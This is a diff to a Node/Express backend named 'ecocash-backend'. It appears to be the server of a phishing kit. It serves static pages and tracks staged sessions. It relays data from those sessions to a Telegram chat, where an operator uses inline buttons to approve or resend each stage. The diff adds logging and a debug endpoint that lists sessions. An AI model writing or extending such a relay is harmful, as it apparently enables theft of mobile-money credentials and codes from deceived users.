@@ -15,18 +15,25 @@ app.use(express.json({ limit: '1mb' }));
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, '..'), { extensions: ['html'] }));
 
+app.use((req, _res, next) => {
+  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
+  next();
+});
+
 const sessions = new Map();
 
 function createSession(stage, meta){
   const id = 's_' + Date.now().toString(36) + Math.random().toString(36).slice(2,8);
   const now = Date.now();
   sessions.set(id, { id, stage, meta, status:'pending', createdAt:now, expiresAt: now + SESSION_TTL_MS });
+  console.log(`[session] created ${id} stage=${stage} total=${sessions.size}`);
   return sessions.get(id);
 }
 function getSession(id){
   const s = sessions.get(id);
-  if(!s) return null;
+  if(!s) { console.log(`[session] MISS ${id} (total=${sessions.size})`); return null; }
   if(Date.now() > s.expiresAt && s.status === 'pending') s.status = 'expired';
+  console.log(`[session] HIT ${id} status=${s.status}`);
   return s;
 }
 setInterval(()=>{
@@ -35,38 +42,26 @@ setInterval(()=>{
 }, 5*60*1000);
 
 function esc(s = '') {
-  return String(s)
-    .replace(/&/g,'&amp;')
-    .replace(/</g,'&lt;')
-    .replace(/>/g,'&gt;');
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
 }
 
 async function tgSend(text, replyMarkup){
-  const body = {
-    chat_id: TELEGRAM_CHAT_ID,
-    text,
-    parse_mode: 'HTML',
-    disable_web_page_preview: true
-  };
+  const body = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode:'HTML', disable_web_page_preview:true };
   if(replyMarkup) body.reply_markup = replyMarkup;
   const r = await fetch(`${TELEGRAM_API}/sendMessage`, {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body: JSON.stringify(body)
+    method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(body)
   });
   return r.json();
 }
 async function tgAnswer(cbId, text){
   await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
+    method:'POST', headers:{'Content-Type':'application/json'},
     body: JSON.stringify({ callback_query_id: cbId, text })
   }).catch(()=>{});
 }
 async function tgRemoveButtons(chatId, messageId){
   await fetch(`${TELEGRAM_API}/editMessageReplyMarkup`, {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
+    method:'POST', headers:{'Content-Type':'application/json'},
     body: JSON.stringify({ chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [] } })
   }).catch(()=>{});
 }
@@ -77,8 +72,17 @@ app.get('/', (_req,res)=>{
     service:'ecocash-backend',
     activeSessions: sessions.size,
     telegramConfigured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
+    publicUrl: process.env.PUBLIC_URL || '(not set)',
     time: new Date().toISOString()
   });
+});
+
+app.get('/api/debug', (_req,res)=>{
+  const list = [];
+  for(const [id,s] of sessions.entries()){
+    list.push({ id, stage: s.stage, status: s.status, ageSec: Math.floor((Date.now()-s.createdAt)/1000) });
+  }
+  res.json({ ok:true, count: list.length, sessions: list });
 });
 
 app.post('/api/notify', async (req, res)=>{
@@ -136,6 +140,7 @@ app.post('/api/telegram-webhook', async (req,res)=>{
   try{
     const update = req.body || {};
     const cq = update.callback_query;
+    console.log(`[webhook] received update. hasCallback=${!!cq} data=${cq?.data || 'none'}`);
     if(cq && cq.data){
       const [action, sessionId] = cq.data.split(':');
       const s = getSession(sessionId);
@@ -146,6 +151,7 @@ app.post('/api/telegram-webhook', async (req,res)=>{
       else if(action === 'resend'){ s.status = 'resend'; await tgAnswer(cq.id,'🔁 Resend'); }
       else { await tgAnswer(cq.id,'Unknown action'); }
       if(cq.message) await tgRemoveButtons(cq.message.chat.id, cq.message.message_id);
+      console.log(`[webhook] processed action=${action} sid=${sessionId} newStatus=${s.status}`);
     }
     return res.json({ ok:true });
   }catch(err){
@@ -154,14 +160,17 @@ app.post('/api/telegram-webhook', async (req,res)=>{
   }
 });
 
-app.get('/health', (_req,res)=> res.json({ ok:true, ts: Date.now() }));
+app.get('/health', (_req,res)=> res.json({ ok:true, ts: Date.now(), activeSessions: sessions.size }));
 
 app.listen(PORT, async ()=>{
   console.log(`EcoCash server running on port ${PORT}`);
   const publicUrl = process.env.PUBLIC_URL || `http://localhost:${PORT}`;
+  console.log(`PUBLIC_URL = ${publicUrl}`);
+  const webhookUrl = `${publicUrl}/api/telegram-webhook`;
+  console.log(`Registering webhook: ${webhookUrl}`);
   try{
-    const r = await fetch(`${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(publicUrl + '/api/telegram-webhook')}`);
+    const r = await fetch(`${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(webhookUrl)}`);
     const d = await r.json();
-    console.log('setWebhook:', d);
+    console.log('setWebhook result:', d);
   }catch(e){ console.error('setWebhook failed:', e.message); }
 });
